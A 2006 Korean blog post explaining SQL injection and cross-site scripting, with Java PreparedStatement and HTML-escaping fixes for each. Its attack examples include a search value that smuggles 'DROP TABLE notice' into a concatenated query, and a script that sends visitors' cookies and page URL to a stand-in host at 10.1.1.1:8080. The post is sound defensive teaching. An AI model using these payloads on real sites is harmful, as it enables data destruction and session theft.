+++
title = "Sql injection & Cross Site Scripting (XSS) 예방책"
date = "2006-08-29T18:56:00+0900"
categories = ["Software Engineering"]
tags = ["sql","injection"]
description = ""
+++
<span class="copyright_entry" style="display:block;" title="Sql injection &amp; Cross Site Scripting (XSS) 예방책@@**@@http://shed.egloos.com/1401958"></span>
<p class="MsoNormal" style=""><b style=""><span style="font-family: 굴림체;" lang="EN-US">&lt; Sql injection&nbsp;&gt;</span></b></p> 
<p class="MsoNormal" style=""><b style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">[</span></b><b style=""><span style="font-size: 10pt; font-family: 굴림체;">공격 예제<span lang="EN-US">]</span></span></b></p> 
<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">Java </span><span style="font-size: 10pt; font-family: 굴림체;">소스의 게시판 검색 <span lang="EN-US">Sql </span>구문 코딩이 아래와 같다고 하고<span lang="EN-US"></span></span></p> 
<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">String findQuery = </span><span style="font-size: 10pt;">“<span lang="EN-US">select * from notice where <b style="">title = '</b></span><b style="">”<span lang="EN-US"> + keyword + </span>“<span lang="EN-US">' </span>“</b><span lang="EN-US"> ;</span></span><span style="font-size: 10pt; font-family: 바탕;" lang="EN-US"></span></p> 
<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">&nbsp;</span></p> 
<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;">홈페이지의 게시판 검색 시 <span style="" lang="EN-US">keyword</span><span lang="EN-US"> </span>에<span lang="EN-US"> <br> <br> </span></span><span style="font-size: 10pt;">“<span lang="EN-US"><span style="">&nbsp;&nbsp; </span>any' <span style="">&nbsp;</span>;<span style="">&nbsp; </span>DROP TABLE NOTICE<span style="">&nbsp;&nbsp; </span></span>“</span><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US"><span style="">&nbsp; </span></span><span style="font-size: 10pt; font-family: 굴림체;">를 넣고 검색한다면 <span lang="EN-US"></span></span></p> 
<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">&nbsp;</span></p> 
<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;">아래와 같은 <span lang="EN-US">Sql </span>구문이 실행되고<span lang="EN-US"></span></span></p> 
<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">SELECT * FROM notice WHERE title = 'any' ;<span style="">&nbsp; </span><b style="">DROP TABLE notice</b></span><span style="font-size: 10pt; font-family: 바탕;" lang="EN-US"></span></p> 
<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">NOTICE </span><span style="font-size: 10pt; font-family: 굴림체;">테이블이 삭제됩니다<span lang="EN-US">.</span></span></p> 
<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">&nbsp;</span></p> 
<p class="MsoNormal" style=""><b style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">[</span></b><b style=""><span style="font-size: 10pt; font-family: 굴림체;">예방법<span lang="EN-US">]</span></span></b></p> 
<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">Sql </span><span style="font-size: 10pt; font-family: 굴림체;">구문을 직접 생성하는 방법을 피하면 됩니다<span lang="EN-US">.</span></span></p> 
<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">Java</span><span style="font-size: 10pt; font-family: 굴림체;">의 경우<span lang="EN-US"> Prepared Statement </span>를 이용하면 예방가능합니다<span lang="EN-US">.</span></span></p> 
<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">--------------------------------------------------------------------------</span></p> 
<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">String findQuery = </span><span style="font-size: 10pt;">“<span lang="EN-US">select * from notice where title = ? </span></span><span style="font-size: 10pt; font-family: 바탕;" lang="EN-US">“</span><span style="font-size: 10pt;" lang="EN-US">;</span><span style="font-size: 10pt; font-family: 바탕;" lang="EN-US"></span></p> 
<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">PreparedStatement pstmt = dbConnection.prepareStatement(findQuery);</span></p> 
<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">pstmt.setString(1, keyword);</span></p> 
<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">ResultSet rs = pstmt.executeQuery();</span></p> 
<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">-----------------------------------------------------------------------</span></p> 
<p class="MsoNormal" style="margin-left: 40pt; text-align: justify; text-indent: -20pt;"><span style="font-size: 10pt; font-family: Wingdings;" lang="EN-US"><span style="">l<span style="font-family: &amp;quot;Times New Roman&amp;quot;; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><span style="font-size: 10pt;">참고<span lang="EN-US"> URL <br> http://korea.internet.com/channel/content.asp?kid=18&amp;cid=185&amp;nid=34414</span></span><span style="font-size: 10pt; font-family: 바탕;" lang="EN-US"></span></p> 
<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">&nbsp;</span></p> 
<p class="MsoNormal" style=""><b style=""><span style="font-family: 굴림체;" lang="EN-US">&lt; Cross Site Scripting&nbsp;(XSS) &gt;<span style="">&nbsp;&nbsp;&nbsp;&nbsp; </span></span></b></p> 
<p class="MsoNormal" style=""><b style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">[</span></b><b style=""><span style="font-size: 10pt; font-family: 굴림체;">공격 예제<span lang="EN-US">]</span></span></b></p> 
<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;">아래의 코드가 웹페이지에 삽입되어 있다면<span lang="EN-US"></span></span></p> 
<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">----------------------------------------------------------------</span><span style="font-size: 10pt; font-family: 바탕;" lang="EN-US"></span></p> 
<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">&lt;script&gt;</span></p> 
<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">document.location.replace('http://10.1.1.1:8080/</span><span style="font-size: 10pt;" lang="EN-US"> <span style="">getCookie.cgi?'+document.cookie+'&amp;'+document.URL);</span></span></p> 
<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">&lt;/script&gt;</span></p> 
<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">---------------------------------------------------------------</span></p> 
<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;">페이지를 접속하는 순간에 사용자의 쿠기값들과 현재 페이지<span lang="EN-US"> URL</span>을 </span><span style="font-size: 10pt;" lang="EN-US"><a href="http://10.1.1.1:8080/getCookie.cgi"><span style="font-family: 굴림체;">http://10.1.1.1:8080/getCookie.cgi</span></a></span><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US"> </span><span style="font-size: 10pt; font-family: 굴림체;">로 전송합니다<span lang="EN-US">.</span></span></p> 
<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;">위의 예 이외에도 여러가지 유형이 있습니다<span lang="EN-US">.</span></span></p> 
<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">&nbsp;</span></p> 
<p class="MsoNormal" style=""><b style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">[</span></b><b style=""><span style="font-size: 10pt; font-family: 굴림체;">예방법<span lang="EN-US">]</span></span></b></p> 
<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;">대부분의<span lang="EN-US"> XSS</span>는 게시판을 통해서 일어나므로<span lang="EN-US"></span></span></p> 
<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;">사용자들 게시판에<span lang="EN-US"> html </span>코드를 쓸 수 없게 합니다<span lang="EN-US">.</span></span></p> 
<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;">이 때<span lang="EN-US"> DB</span>에 게시물을<span lang="EN-US"> Insert </span>시에는 처리할 것이 없습니다<span lang="EN-US">.</span></span></p> 
<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">DB</span><span style="font-size: 10pt; font-family: 굴림체;">에서 해당 게시물을 조회할 때<span lang="EN-US"></span></span></p> 
<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;">게시물 내용에서<span lang="EN-US"><span style="">&nbsp; </span></span>“<span lang="EN-US"> &lt; </span>“<span lang="EN-US"><span style="">&nbsp; </span></span>는<span lang="EN-US"><span style="">&nbsp; </span>&amp;lt;<span style="">&nbsp; </span></span>로 변경 하고<span lang="EN-US"><span style="">&nbsp;&nbsp;&nbsp; </span></span>”<span lang="EN-US"> &gt; </span>“ 는<span lang="EN-US"><span style="">&nbsp; </span>&amp;gt; </span>로 변경 해주면 웹브라우져는 악의적인 코드를<span lang="EN-US"> html</span>태그로 인식하지 않으므로 스크립트가 실행되지 않습니다<span lang="EN-US">(</span>화면에는 입력한 대로 출력되어 보이게 됩니다<span lang="EN-US">).</span></span></p> 
<p class="MsoNormal" style="margin-left: 40pt; text-align: justify; text-indent: -20pt;"><span style="font-size: 10pt; font-family: Wingdings;" lang="EN-US"><span style="">l<span style="font-family: &amp;quot;Times New Roman&amp;quot;; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><span style="font-size: 10pt;">참고<span lang="EN-US"> URL<br> http://www.zdnet.co.kr/builder/system/security/0,39031673,39131781,00.htm</span></span><span style="font-size: 10pt; font-family: 바탕;" lang="EN-US"></span></p> 
<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">&nbsp;</span></p> 
<!--
       <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
		    xmlns:dc="http://purl.org/dc/elements/1.1/"
		    xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
       <rdf:Description
	        rdf:about="http://shed.egloos.com/1401958"
	        dc:identifier="http://shed.egloos.com/1401958"
	        dc:title="Sql injection &amp; Cross Site Scripting (XSS) 예방책"
	        trackback:ping="http://shed.egloos.com/tb/1401958"/>
       </rdf:RDF>
       -->

<ul></ul>